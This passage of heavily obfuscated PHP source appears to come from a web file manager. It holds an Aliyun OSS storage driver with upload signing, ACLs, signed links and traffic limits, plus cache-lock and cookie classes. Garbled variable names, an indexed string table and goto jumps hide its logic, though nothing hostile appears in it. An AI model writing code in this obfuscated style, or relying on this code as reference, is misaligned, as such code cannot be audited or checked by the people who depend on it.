$‡ΗΪµΒ¥[$άη‘‡Μ[79]]; } } public function has($ίΊόΒΎ, $ά£ΰΜ”Ρ = false, $ϊ¨±μ³ = true) { $ΉΔό”¬ =& $_SERVER[γγάψ½]; $ίΊόΒΎ = trim($ίΊόΒΎ, $ΉΔό”¬[8]); $χ””σΏ« = empty($ίΊόΒΎ) && $ίΊόΒΎ !== $ΉΔό”¬[231] ? $ΉΔό”¬[12] : $ίΊόΒΎ . $ΉΔό”¬[8]; $―Πη = $ΉΔό”¬[12]; $Ρ—…… = 500; $ΦχΜλ = $’υα¨΄ = 0; while (!0) { check_abort(); $ΟήηΐΚ = array($ΉΔό”¬[1492] => $ΉΔό”¬[8], $ΉΔό”¬[1493] => $χ””σΏ«, $ΉΔό”¬[1494] => $Ρ—……, $ΉΔό”¬[1495] => $―Πη); try { $Εκβ’ƒ = $this->client->listObjects($this->bucket, $ΟήηΐΚ); } catch (OSS\Core\OssException $τ¦ΩΊ™Φ) { $this->writeLog(__FUNCTION__ . $ΉΔό”¬[215] . $τ¦ΩΊ™Φ->getMessage()); break; } $―Πη = $Εκβ’ƒ->getNextMarker(); $σ©Ίχ = $Εκβ’ƒ->getObjectList(); $ν„ϋύ = $Εκβ’ƒ->getPrefixList(); if ($ά£ΰΜ”Ρ) { if (count($σ©Ίχ) > 1 || count($σ©Ίχ) == 1 && $σ©Ίχ[0]->getKey() != $χ””σΏ«) { $ΦχΜλ += count($σ©Ίχ) - 1; } if (!empty($ν„ϋύ)) { $’υα¨΄ += count($ν„ϋύ); } if ($―Πη === $ΉΔό”¬[12]) { break; } continue; } if ($ϊ¨±μ³) { if (!empty($σ©Ίχ)) { if (count($σ©Ίχ) > 1 || $σ©Ίχ[0]->getKey() != $χ””σΏ«) { return !0; } } } else { if (!empty($ν„ϋύ)) { return !0; } } if ($―Πη === $ΉΔό”¬[12]) { break; } } if ($ά£ΰΜ”Ρ) { return array($ΉΔό”¬[242] => $ΦχΜλ, $ΉΔό”¬[243] => $’υα¨΄); } return !1; } public function listAll($ςφΥΝ£‘) { $ϋήφΝ»Ό =& $_SERVER[γγάψ½]; $¦­‘Σπ = $this->fileList($ςφΥΝ£‘, $ϋήφΝ»Ό[12], !0); $Ϋ‹²¦½Β = array_to_keyvalue($¦­‘Σπ[$ϋήφΝ»Ό[86]], $ϋήφΝ»Ό[32]); foreach ($¦­‘Σπ[$ϋήφΝ»Ό[85]] as $µ®ΊλΛ½) { if (is_string($µ®ΊλΛ½)) { $Ϋ‹²¦½Β[$µ®ΊλΛ½] = array($ϋήφΝ»Ό[79] => 0); } } return $this->listAllFiles($ςφΥΝ£‘, $Ϋ‹²¦½Β); } public function canRead($ύκΒΝ¶) { $ƒαώοξ =& $_SERVER[γγάψ½]; $φΟαΜ³ = $this->pathAcl($ύκΒΝ¶); return $φΟαΜ³ == $ƒαώοξ[1502] || $φΟαΜ³ == $ƒαώοξ[627] ? !0 : !1; } public function canWrite($ώΈώμΌ) { $θ‰½¦„« = $this->pathAcl($ώΈώμΌ); return $θ‰½¦„« == $_SERVER[γγάψ½][627] ? !0 : !1; } public function pathAcl($•”•δι) { $¥σ–ΜΡ =& $_SERVER[γγάψ½]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $—θΛάΝ† = $this->client->getObjectAcl($this->bucket, $this->pathEncode($•”•δι)); } catch (OSS\Core\OssException $¶ώ™ύζΤ) { $this->writeLog(__FUNCTION__ . $¥σ–ΜΡ[215] . $¶ώ™ύζΤ->getMessage()); return !1; } $†‰„µΎή = $—θΛάΝ† == $¥σ–ΜΡ[37] ? $this->bucketAcl : $—θΛάΝ†; if ($†‰„µΎή == $¥σ–ΜΡ[1503]) { return $¥σ–ΜΡ[1502]; } if ($†‰„µΎή == $¥σ–ΜΡ[1504]) { return $¥σ–ΜΡ[627]; } return $†‰„µΎή; } private function chmodPath($ηγΣ―τ, $Υί‚ = '') { $ΙηΪσΫΞ =& $_SERVER[γγάψ½]; $ΤλΦΜ = empty($Υί‚) ? $ΙηΪσΫΞ[1504] : $Υί‚; $®Θƒυέέ = array($ΙηΪσΫΞ[37], $ΙηΪσΫΞ[232], $ΙηΪσΫΞ[1503], $ΙηΪσΫΞ[1504]); if (!in_array($ΤλΦΜ, $®Θƒυέέ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ηγΣ―τ), $ΤλΦΜ); } catch (OSS\Core\OssException $µΖ°£–) { $this->writeLog(__FUNCTION__ . $ΙηΪσΫΞ[215] . $µΖ°£–->getMessage()); return !1; } return !0; } public function getContent($„ςΊϊό) { return $this->fileSubstr($„ςΊϊό, -1); } public function setContent($ΐ³”π¥Ϋ, $σΠ²«€Ι = '') { $‚Ψ―­ώχ =& $_SERVER[γγάψ½]; try { $οάΛΩΞƒ = $this->trafficLimit($‚Ψ―­ώχ[1505]); $²‡­®€ο = $this->client->putObject($this->bucket, $this->pathEncode($ΐ³”π¥Ϋ), $σΠ²«€Ι, $οάΛΩΞƒ); } catch (OSS\Core\OssException $ψ„€Ύ‘ά) { $this->writeLog(__FUNCTION__ . $‚Ψ―­ώχ[215] . $ψ„€Ύ‘ά->getMessage()); return !1; } $Μ›§Ώϋ  = array($‚Ψ―­ώχ[1499] => trim($²‡­®€ο[$‚Ψ―­ώχ[1496]], $‚Ψ―­ώχ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ΐ³”π¥Ϋ))); $this->updateObjMeta($ΐ³”π¥Ϋ, $Μ›§Ώϋ ); return isset($²‡­®€ο[$‚Ψ―­ώχ[1506]][$‚Ψ―­ώχ[297]]) ? !0 : !1; } private function updateObjMeta($έΝ„‡‚, $ΰρΏΣγΪ) { $έΝ„‡‚ = $this->pathEncode($έΝ„‡‚); try { $ Ζ·βΫΠ = array(OSS\OssClient::OSS_HEADERS => $ΰρΏΣγΪ); $this->client->copyObject($this->bucket, $έΝ„‡‚, $this->bucket, $έΝ„‡‚, $ Ζ·βΫΠ); } catch (OSS\Core\OssException $πΜό»·) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $πΜό»·->getMessage()); return !1; } return !0; } public function upload($ΘςόΡΣ, $Δ¶ΛΕΔΎ, $Ί…Υµ¬ = false, $ύΧ›ωΊ = REPEAT_REPLACE) { $ύωψάΰΐ =& $_SERVER[γγάψ½]; $ύββµ¬ = trim($ΘςόΡΣ, $ύωψάΰΐ[8]); $ώδΤ§Ε = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ύωψάΰΐ[1499] => @md5_file($Δ¶ΛΕΔΎ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ΘςόΡΣ))); $ώδΤ§Ε = $this->trafficLimit($ύωψάΰΐ[1505], $ώδΤ§Ε); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ύββµ¬), $Δ¶ΛΕΔΎ, $ώδΤ§Ε); } catch (OSS\Core\OssException $ί‰ρ²Ξ›) { $this->writeLog(__FUNCTION__ . $ύωψάΰΐ[215] . $ί‰ρ²Ξ›->getMessage()); return !1; } return $this->getPathOuter($ΘςόΡΣ); } public function getHost() { $›ΣΏ‹ =& $_SERVER[γγάψ½]; $ΜΎ€βγς = explode($›ΣΏ‹[211], parent::getHost()); return $ΜΎ€βγς[0] . $›ΣΏ‹[211] . $this->bucket . $›ΣΏ‹[10] . $ΜΎ€βγς[1]; } public function uploadFormData($ΡύΖλΒ, $–οΗ¨ε = 3600) { $κιάΡΞΑ =& $_SERVER[γγάψ½]; if (!($¥Ξ™ωσΘ = $this->getHost())) { return !1; } $‡‚½ό· = $–οΗ¨ε; $‘¥ς…ιΏ = date($κιάΡΞΑ[1507], time() + $‡‚½ό·); $—έ‰υ‡§ = new DateTime($‘¥ς…ιΏ); $£υωΫπ” = $—έ‰υ‡§->format(DateTime::ISO8601); $θΈδ”Ϋ = strpos($£υωΫπ”, $κιάΡΞΑ[374]); $£υωΫπ” = substr($£υωΫπ”, 0, $θΈδ”Ϋ) . $κιάΡΞΑ[1508]; $ψΟƒ―•Ψ = 1048576000 * 5; $©Ρϊ†£Α = $this->pathFather($ΡύΖλΒ); $Σξ‹ώ‰΄ = array($κιάΡΞΑ[265] => $£υωΫπ”, $κιάΡΞΑ[268] => array(array($κιάΡΞΑ[1509], 0, $ψΟƒ―•Ψ), array($κιάΡΞΑ[270], $κιάΡΞΑ[271], $©Ρϊ†£Α))); $Ύ„™Ήƒ = base64_encode(json_encode($Σξ‹ώ‰΄)); $Π“ ΰ°β = base64_encode(hash_hmac($κιάΡΞΑ[1430], $Ύ„™Ήƒ, $this->secret, !0)); $Ε¤‘΄―— = array($κιάΡΞΑ[1510] => $this->accessKey, $κιάΡΞΑ[280] => $Ύ„™Ήƒ, $κιάΡΞΑ[273] => $κιάΡΞΑ[264], $κιάΡΞΑ[1511] => $Π“ ΰ°β, $κιάΡΞΑ[209] => $¥Ξ™ωσΘ); $Ε¤‘΄―— = $this->trafficLimit($κιάΡΞΑ[1505], $Ε¤‘΄―—, !0); return $Ε¤‘΄―—; } public function uploadMultiData($Η¶Χ„, $°—Ύϊ» = 3600) { $ΑωϊΠ =& $_SERVER[γγάψ½]; if (!($©ςσ‡ξ» = $this->getHost())) { return !1; } $πΧΨ· ½ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Η¶Χ„)); return array($ΑωϊΠ[284] => $πΧΨ· ½, $ΑωϊΠ[209] => $©ςσ‡ξ» . $ΑωϊΠ[8] . $this->pathEncode($Η¶Χ„), $ΑωϊΠ[285] => gmdate($ΑωϊΠ[1512]), $ΑωϊΠ[97] => $Η¶Χ„); } public function uploadMultiAuth($ώ‡Ή–—, $Λ³›Ε = array()) { if (isset($Λ³›Ε[$_SERVER[γγάψ½][286]])) { return $this->uploadPartAuth($ώ‡Ή–—, $Λ³›Ε); } return $this->uploadListAuth($ώ‡Ή–—, $Λ³›Ε); } private function uploadPartAuth($½πΰ³ΐδ, $‚ΰ‚“³ = array()) { $ώΤΏΟΛ‡ =& $_SERVER[γγάψ½]; $–Λ…ΰ¶ = $‚ΰ‚“³[$ώΤΏΟΛ‡[97]]; $‘“ββα = $this->_getUploadAuth($–Λ…ΰ¶, $‚ΰ‚“³); $›Ίπ†± = array($ώΤΏΟΛ‡[289] => $‘“ββα[$ώΤΏΟΛ‡[289]], $ώΤΏΟΛ‡[285] => $‘“ββα[$ώΤΏΟΛ‡[285]]); if (isset($‘“ββα[$ώΤΏΟΛ‡[1513]])) { $›Ίπ†±[$ώΤΏΟΛ‡[1513]] = $‘“ββα[$ώΤΏΟΛ‡[1513]]; } return $›Ίπ†±; } private function uploadListAuth($Μμϋ‰΅”, $‡λχ› = array()) { $ΌυΝ… =& $_SERVER[γγάψ½]; $ΙαΓ£Ώ = $‡λχ›[$ΌυΝ…[97]]; $Ή·ΧΥ­α = $‡λχ›[$ΌυΝ…[284]]; $¨§‹ΉΠ = $this->client->listParts($this->bucket, $this->pathEncode($ΙαΓ£Ώ), $Ή·ΧΥ­α); $°ΧΘύΜ = $¨§‹ΉΠ->getListPart(); $Ώ‹ϋάΧα = array(); foreach ($°ΧΘύΜ as $ΉΪ¥£ψ) { $Ώ‹ϋάΧα[] = array($ΌυΝ…[300] => $ΉΪ¥£ψ->getPartNumber(), $ΌυΝ…[301] => trim($ΉΪ¥£ψ->getETag(), $ΌυΝ…[121])); } if (!$Ώ‹ϋάΧα) { return !1; } $Ζ°πβ = $this->_getUploadAuth($ΙαΓ£Ώ, $‡λχ›); return array($ΌυΝ…[289] => $Ζ°πβ[$ΌυΝ…[289]], $ΌυΝ…[285] => $Ζ°πβ[$ΌυΝ…[285]], $ΌυΝ…[292] => $Ώ‹ϋάΧα); } private function _getUploadAuth($³ϊζάΈ, $―ΨΛΠ›Ϊ) { $΅φλΪ“ =& $_SERVER[γγάψ½]; $χζ‰Ζ± = gmdate($΅φλΪ“[1512]); $Όθ»λ = isset($―ΨΛΠ›Ϊ[$΅φλΪ“[286]]) ? $΅φλΪ“[256] : $΅φλΪ“[291]; $±ωϊΓσΪ = array_intersect_key($―ΨΛΠ›Ϊ, array_flip(array($΅φλΪ“[286], $΅φλΪ“[284]))); ksort($±ωϊΓσΪ); $½ήξΉρς = $±ωϊΓσΪ ? $΅φλΪ“[76] . http_build_query($±ωϊΓσΪ, null, $΅φλΪ“[287], PHP_QUERY_RFC3986) : $΅φλΪ“[12]; $ά»°ώ³ = array($Όθ»λ, $΅φλΪ“[12], $΅φλΪ“[123], $χζ‰Ζ±, "\170\55\x6f\x73\163\x2d\x64\141\x74\x65\72{$χζ‰Ζ±}", $΅φλΪ“[8] . $this->bucket . $΅φλΪ“[8] . $³ϊζάΈ . $½ήξΉρς); if (isset($―ΨΛΠ›Ϊ[$΅φλΪ“[286]])) { $εσΈρ = $this->trafficLimit($΅φλΪ“[1505], array(), !0); if ($εσΈρ) { $³ϊζάΈ = $΅φλΪ“[1513]; array_splice($ά»°ώ³, 5, 0, $³ϊζάΈ . $΅φλΪ“[4] . $εσΈρ[$³ϊζάΈ]); } } $ϋθξψ®§ = implode($΅φλΪ“[288], $ά»°ώ³); $ΰµεφ­‹ = base64_encode(hash_hmac($΅φλΪ“[1430], $ϋθξψ®§, $this->secret, !0)); $±χΞξ = $΅φλΪ“[1482] . $this->accessKey . $΅φλΪ“[4] . $ΰµεφ­‹; $Έ α”’ = array($΅φλΪ“[289] => $±χΞξ, $΅φλΪ“[285] => $χζ‰Ζ±); if (!empty($εσΈρ)) { $Έ α”’ = array_merge($Έ α”’, $εσΈρ); } return $Έ α”’; } public function download($®ΰ²ΖΩί, $Ύ©±΄±) { $¦Έϊά¥ =& $_SERVER[γγάψ½]; if ($this->isFolder($®ΰ²ΖΩί)) { return !1; } try { $ΨΑ’ϋΙ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ύ©±΄±); $ΨΑ’ϋΙ = $this->trafficLimit($¦Έϊά¥[112], $ΨΑ’ϋΙ); $this->client->getObject($this->bucket, $this->pathEncode($®ΰ²ΖΩί), $ΨΑ’ϋΙ); } catch (OSS\Core\OssException $½βώ) { $this->writeLog(__FUNCTION__ . $¦Έϊά¥[215] . $½βώ->getMessage()); return !1; } return $Ύ©±΄±; } public function fileSubstr($ρ³ΎΜ–, $ηΘΫΧόθ = 0, $΄†“€ = false) { if ($ηΘΫΧόθ === -1) { $α—Μ£¨ε = array(); } else { if ($΄†“€ === !1) { $ίγράσκ = $this->size($ρ³ΎΜ–); } else { $ίγράσκ = $ηΘΫΧόθ + $΄†“€ - 1; } $α—Μ£¨ε = array(OSS\OssClient::OSS_RANGE => "{$ηΘΫΧόθ}\x2d{$ίγράσκ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ρ³ΎΜ–), $α—Μ£¨ε); } catch (OSS\Core\OssException $‹δ²ήρ΄) { $this->writeLog(__FUNCTION__ . $_SERVER[γγάψ½][215] . $‹δ²ήρ΄->getMessage()); think_exception($‹δ²ήρ΄->getMessage()); return !1; } } private function trafficLimit($ή•¥, $ΜΈΞΒ = array(), $…α‚ΜΫ = false) { $άΠώΔ¬ =& $_SERVER[γγάψ½]; if ($ή•¥ == $άΠώΔ¬[1505] && $this->isUploadServer() || $ή•¥ == $άΠώΔ¬[112] && $this->isFileOutServer()) { return $ΜΈΞΒ; } $±½„¥έ = floatval($GLOBALS[$άΠώΔ¬[6]][$άΠώΔ¬[92]][$άΠώΔ¬[110]][$ή•¥]) * 1024 * 1024 * 8; if (!$±½„¥έ) { return $ΜΈΞΒ; } $±½„¥έ = $±½„¥έ < 819200 ? 819200 : ($±½„¥έ > 838860800 ? 838860800 : $±½„¥έ); if ($…α‚ΜΫ) { $ΜΈΞΒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($±½„¥έ); } else { if (!isset($ΜΈΞΒ[OSS\OssClient::OSS_HEADERS])) { $ΜΈΞΒ[OSS\OssClient::OSS_HEADERS] = array(); } $ΜΈΞΒ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($±½„¥έ); } return $ΜΈΞΒ; } public function link($λ®‡¤, $‹ύΩβΫ‚ = array()) { $Σ ΒΑΩΪ =& $_SERVER[γγάψ½]; if (!$this->exist($λ®‡¤) || $this->isFolder($λ®‡¤)) { return !1; } try { $‹ύΩβΫ‚ = $this->trafficLimit($Σ ΒΑΩΪ[112], $‹ύΩβΫ‚, !0); $‚ήγχλ = $this->client->signUrl($this->bucket, $this->pathEncode($λ®‡¤), 3600 * 12, $Σ ΒΑΩΪ[1514], $‹ύΩβΫ‚); return $this->getCdnLink($‚ήγχλ); } catch (OSS\Core\OssException $¤Ψ²–Ή) { $this->writeLog(__FUNCTION__ . $Σ ΒΑΩΪ[215] . $¤Ψ²–Ή->getMessage()); return !1; } } public function fileOut($Εβ•ΰρ, $›ό‡¤Η = false, $άΟσΒ± = false, $ΡεψΌΠΩ = '') { $Η™Υ­ΪΡ =& $_SERVER[γγάψ½]; if ($this->isFileOutServer()) { return $this->fileOutServer($Εβ•ΰρ, $›ό‡¤Η, $άΟσΒ±, $ΡεψΌΠΩ); } if (!$άΟσΒ±) { $άΟσΒ± = $this->pathThis($Εβ•ΰρ); } $άΟσΒ± = rawurlencode($άΟσΒ±); $¥ΑξΓΝ» = get_file_mime(get_path_ext($άΟσΒ±)); if ($¥ΑξΓΝ» == $Η™Υ­ΪΡ[251]) { return parent::fileOut($Εβ•ΰρ, $›ό‡¤Η, $άΟσΒ±, $ΡεψΌΠΩ); } $›ό‡¤Η = $›ό‡¤Η ? $Η™Υ­ΪΡ[1515] : $Η™Υ­ΪΡ[1516]; $ΚΧπ»“ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Η™Υ­ΪΡ[1517] . rawurlencode("{$›ό‡¤Η}\73\146\151\x6c\x65\x6e\141\x6d\145\x3d{$άΟσΒ±}")); $Β—ο§”ο = $this->link($Εβ•ΰρ, $ΚΧπ»“); $this->fileOutLink($Β—ο§”ο); } public function fileOutServer($Ρ―θ¤Π‘, $ώ±°δ…ώ = false, $²Δι½® = false, $­·†‰τμ = '') { parent::fileOut($Ρ―θ¤Π‘, $ώ±°δ…ώ, $²Δι½®, $­·†‰τμ); } public function fileOutImage($¶Α‹›π‰, $όƒσΦΚ = 250) { if ($this->size($¶Α‹›π‰) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¶Α‹›π‰, $όƒσΦΚ); } $Φ¶™¤κ‰ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[γγάψ½][1479] . $όƒσΦΚ); $ύ­†¤¨ = $this->link($¶Α‹›π‰, $Φ¶™¤κ‰); $this->fileOutLink($ύ­†¤¨); } public function fileOutImageServer($’φ΄ΎμΟ, $»υξΚ¬” = 250) { parent::fileOutImage($’φ΄ΎμΟ, $»υξΚ¬”); } public function fileOutLink($±υν·) { $’Μ·„™ =& $_SERVER[γγάψ½]; if (!$this->isCdnHost() && substr($±υν·, 0, 7) == $’Μ·„™[219]) { $±υν· = $’Μ·„™[220] . substr($±υν·, 7); } header($’Μ·„™[175] . $±υν·); die; } public function hashMd5($―ά«“τ, $ΑΪΤ‹φβ = '') { $ΊΆ¶Ι  =& $_SERVER[γγάψ½]; $υ†άι‹Β = $this->_objectMeta($―ά«“τ); if (!$υ†άι‹Β) { return $ΊΆ¶Ι [12]; } if (!isset($υ†άι‹Β[$ΊΆ¶Ι [1499]]) && !empty($ΑΪΤ‹φβ)) { $–αΛΡΔ = $this->updateObjMeta($―ά«“τ, array($ΊΆ¶Ι [1499] => $ΑΪΤ‹φβ)); $υ†άι‹Β[$ΊΆ¶Ι [1499]] = $–αΛΡΔ ? $ΑΪΤ‹φβ : $ΊΆ¶Ι [12]; } return isset($υ†άι‹Β[$ΊΆ¶Ι [1499]]) ? strtolower($υ†άι‹Β[$ΊΆ¶Ι [1499]]) : $ΊΆ¶Ι [12]; } public function size($ήοπ”£ρ) { $§¬‡ ο¤ = $this->objectMeta($ήοπ”£ρ); return $§¬‡ ο¤ ? $§¬‡ ο¤[$_SERVER[γγάψ½][79]] : 0; } public function info($Ω³ξΠπ) { if ($this->isFolder($Ω³ξΠπ)) { return $this->folderInfo($Ω³ξΠπ); } else { if ($this->isFile($Ω³ξΠπ)) { return $this->fileInfo($Ω³ξΠπ); } } return !1; } public function exist($Ψδƒ¨ύ) { return $this->isFile($Ψδƒ¨ύ) || $this->isFolder($Ψδƒ¨ύ); } public function isFile($έ™ΙΚ) { return !$this->isFolder($έ™ΙΚ) && $this->objectMeta($έ™ΙΚ); } public function isFolder($λΤΧΦζά) { return $this->cacheMethod($_SERVER[γγάψ½][180], $λΤΧΦζά); } protected function objectMeta($§µ–) { return $this->cacheMethod($_SERVER[γγάψ½][182], $§µ–); } protected function _objectMeta($»ΚπΤΔ) { $ΉΤΚΒκς =& $_SERVER[γγάψ½]; try { $ΪΦ»ΣΎ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($»ΚπΤΔ)); } catch (OSS\Core\OssException $Ίό·ΓΛ) { $this->writeLog(__FUNCTION__ . $ΉΤΚΒκς[215] . $Ίό·ΓΛ->getMessage()); $ΪΦ»ΣΎ = !1; } if ($ΪΦ»ΣΎ) { $ΪΦ»ΣΎ[$ΉΤΚΒκς[79]] = intval($ΪΦ»ΣΎ[$ΉΤΚΒκς[1497]]); } return $ΪΦ»ΣΎ; } protected function _isFolder($ΊΠ†οί) { $Ε®‚Υ–Ι =& $_SERVER[γγάψ½]; if ($ΊΠ†οί == $Ε®‚Υ–Ι[12] || $ΊΠ†οί == $Ε®‚Υ–Ι[8]) { return !0; } $¦ΜƒΓ΅ν = array($Ε®‚Υ–Ι[1492] => $Ε®‚Υ–Ι[8], $Ε®‚Υ–Ι[1493] => rtrim($ΊΠ†οί, $Ε®‚Υ–Ι[8]) . $Ε®‚Υ–Ι[8], $Ε®‚Υ–Ι[1494] => 1, $Ε®‚Υ–Ι[1495] => $Ε®‚Υ–Ι[12]); $†ΛάΊεΒ = $this->client->listObjects($this->bucket, $¦ΜƒΓ΅ν); if ($†ΛάΊεΒ->getObjectList() || $†ΛάΊεΒ->getPrefixList()) { return !0; } return !1; } public function writeLog($ ½ο²±¶ = '', $ΆζωΔ° = false) { $’ύ³ =& $_SERVER[γγάψ½]; $Λώ¦›λ = in_array(ACTION, array($’ύ³[213], $’ύ³[214])); if (!$Λώ¦›λ && !GLOBAL_DEBUG) { return; } $»£Τς­ = 0; if (stripos($ ½ο²±¶, $’ύ³[1518]) !== !1) { $»£Τς­ = 1; $ΑΩ‚ωΚΏ = explode($’ύ³[1519], $ ½ο²±¶); $ ½ο²±¶ = !empty($ΑΩ‚ωΚΏ[1]) ? $ΑΩ‚ωΚΏ[1] : $ ½ο²±¶; } else { if (stripos($ ½ο²±¶, $’ύ³[1520])) { $»£Τς­ = 2; $ΑΩ‚ωΚΏ = explode($’ύ³[1520], $ ½ο²±¶); $ΑΩ‚ωΚΏ = explode($’ύ³[4], $ΑΩ‚ωΚΏ[0]); $ ½ο²±¶ = !empty($ΑΩ‚ωΚΏ[1]) ? $ΑΩ‚ωΚΏ[1] : $ ½ο²±¶; } } if ($Λώ¦›λ && I18n::getType() == $’ύ³[1521]) { if ($»£Τς­ == 1) { $ ½ο²±¶ = str_replace($’ύ³[1522], $’ύ³[1523], $ ½ο²±¶); } else { if ($»£Τς­ == 2) { $ΑΩ‚ωΚΏ = explode($’ύ³[215], $ΑΩ‚ωΚΏ[0]); $ωά¤ςδω = isset($ΑΩ‚ωΚΏ[1]) ? $ΑΩ‚ωΚΏ[1] : $’ύ³[12]; $η¬αη‰Π = array($’ύ³[1524] => $’ύ³[1525], $’ύ³[1526] => $’ύ³[1527], $’ύ³[1528] => $’ύ³[1529], $’ύ³[1530] => $’ύ³[1531], $’ύ³[1532] => $’ύ³[1533], $’ύ³[1534] => $’ύ³[1535], $’ύ³[1536] => $’ύ³[1537], $’ύ³[1538] => $’ύ³[1539], $’ύ³[1540] => $’ύ³[1541], $’ύ³[1542] => $’ύ³[1543]); if (isset($η¬αη‰Π[$ωά¤ςδω])) { $ ½ο²±¶ = $η¬αη‰Π[$ωά¤ςδω]; } } } if (stripos($ ½ο²±¶, $’ύ³[1544])) { $ ½ο²±¶ = $’ύ³[1545]; } } if (!trim($ ½ο²±¶)) { return; } parent::writeLog(trim($ ½ο²±¶), $ΆζωΔ°); } } goto E‚©ίβΧ›Λ; eφ„γκα†Η: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ϋ•θΥΎΫ =& $_SERVER[γγάψ½]; $ο£ΚχΧΝ = $GLOBALS[$Ϋ•θΥΎΫ[6]][$Ϋ•θΥΎΫ[427]]; self::$cachePath = $ο£ΚχΧΝ[$Ϋ•θΥΎΫ[233]][$Ϋ•θΥΎΫ[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($βΰΌς†ϊ, $³μ–φΣώ = 0) { $Γ²Ώ‡΄ =& $_SERVER[γγάψ½]; $έ«β΅ΐ… = microtime(!0); $„„Φωµ” = $έ«β΅ΐ… + $³μ–φΣώ + 0.0001; $²μό—®ώ = rtrim(self::$cachePath, $Γ²Ώ‡΄[8]) . $Γ²Ώ‡΄[945] . md5($βΰΌς†ϊ) . $Γ²Ώ‡΄[942]; if (file_exists($²μό—®ώ) && filemtime($²μό—®ώ) && filemtime($²μό—®ώ) < time() - 10) { @unlink($²μό—®ώ); } do { if (file_exists($²μό—®ώ)) { cacheLockWait(); continue; } $Λ®ρφ = fopen($²μό—®ώ, $Γ²Ώ‡΄[946]); if (!$Λ®ρφ) { return !1; } $¬ΨΎω£ = flock($Λ®ρφ, LOCK_EX | LOCK_NB); self::$caches[$βΰΌς†ϊ] = array($Γ²Ώ‡΄[947] => $Λ®ρφ, $Γ²Ώ‡΄[233] => $²μό—®ώ); fwrite($Λ®ρφ, $„„Φωµ”); clearstatcache(); if ($Λ®ρφ && $¬ΨΎω£) { return !0; } cacheLockWait(); } while (microtime(!0) < $„„Φωµ”); $this->unlock($βΰΌς†ϊ); return !1; } public function lockGet($΅®ΨΩΩ) { $ί¥–ΦΚ =& $_SERVER[γγάψ½]; $€ψ„†ο = rtrim(self::$cachePath, $ί¥–ΦΚ[8]) . $ί¥–ΦΚ[945] . md5($΅®ΨΩΩ) . $ί¥–ΦΚ[942]; return file_exists($€ψ„†ο); } public function unlock($ϊ™²θΎ) { $ΖΆ¥¨μ¬ =& $_SERVER[γγάψ½]; $΄σπ–ζ = self::$caches[$ϊ™²θΎ]; if (!$΄σπ–ζ) { return; } @flock($΄σπ–ζ[$ΖΆ¥¨μ¬[947]], LOCK_UN); @fclose($΄σπ–ζ[$ΖΆ¥¨μ¬[947]]); @unlink($΄σπ–ζ[$ΖΆ¥¨μ¬[233]]); unset(self::$caches[$ϊ™²θΎ]); } } class CacheLockRedis { public function lock($τς§ΔΗ›, $όΖδΝΈΒ = 10) { $Λ‰¦Ν…Ό = Cache::init(); $ύόΑψΧ = microtime(!0) + $όΖδΝΈΒ; while (microtime(!0) < $ύόΑψΧ) { $η­–Φ¨χ = $Λ‰¦Ν…Ό->get($τς§ΔΗ›); if (!$η­–Φ¨χ) { $‘¶Τό = $Λ‰¦Ν…Ό->setLock($τς§ΔΗ›, $ύόΑψΧ, $όΖδΝΈΒ); if ($‘¶Τό) { return !0; } } else { if ($η­–Φ¨χ < microtime(!0)) { $Λ‰¦Ν…Ό->set($τς§ΔΗ›, $ύόΑψΧ, $όΖδΝΈΒ * 2); if ($Λ‰¦Ν…Ό->get($τς§ΔΗ›) === $η­–Φ¨χ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($“Δπξδ) { return Cache::init()->get($“Δπξδ); } public function unlock($•ΟΑΨΫζ) { return Cache::init()->remove($•ΟΑΨΫζ); } } class CacheLockMemcached { public function lock($ Ν›κΚ, $Ψγ«ΆςΣ = 0) { $αΩΎ ψ = Cache::init(); $¶ΊΞ½Ά = microtime(!0) + $Ψγ«ΆςΣ; while (microtime(!0) < $¶ΊΞ½Ά) { $βύ©€‰ζ = $αΩΎ ψ->get($ Ν›κΚ); if (!$βύ©€‰ζ || $βύ©€‰ζ < microtime(!0)) { $Ά›Ζό = $αΩΎ ψ->handle->add($ Ν›κΚ, $¶ΊΞ½Ά, $Ψγ«ΆςΣ); if ($Ά›Ζό) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ύ‰ύΔνΨ) { return Cache::init()->get($Ύ‰ύΔνΨ); } public function unlock($…ϊςΗμ) { return Cache::init()->remove($…ϊςΗμ); } } goto CΤκ†εθΟ; a§ή”Ω¥„: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($θ•±Πƒ = '', $ΊΑδ³ = 0) { if (is_string($θ•±Πƒ) && $θ•±Πƒ != $_SERVER[γγάψ½][12]) { $this->prefix = $θ•±Πƒ; } if (is_numeric($ΊΑδ³) && $ΊΑδ³ > 0) { $this->expire = $ΊΑδ³; } } public static function getInstance() { static $²¦ΞΦί§; if ($²¦ΞΦί§ === null) { $²¦ΞΦί§ = new self(); } return $²¦ΞΦί§; } private static $cookieDisable = false; public static function disable($€§§Γ³) { self::$cookieDisable = $€§§Γ³; } private static $sameCookieSet = array(); public static function set($Ι·®Ξ—, $µρωΧµλ, $®…ΊΡξγ = 0, $ήµΣΏ¥£ = false, $ύαΜ›±ΰ = false) { $¦κΐΰ»» =& $_SERVER[γγάψ½]; if (self::$cookieDisable) { return; } if (!$®…ΊΡξγ) { $®…ΊΡξγ = 24 * 3600 * 7; } if 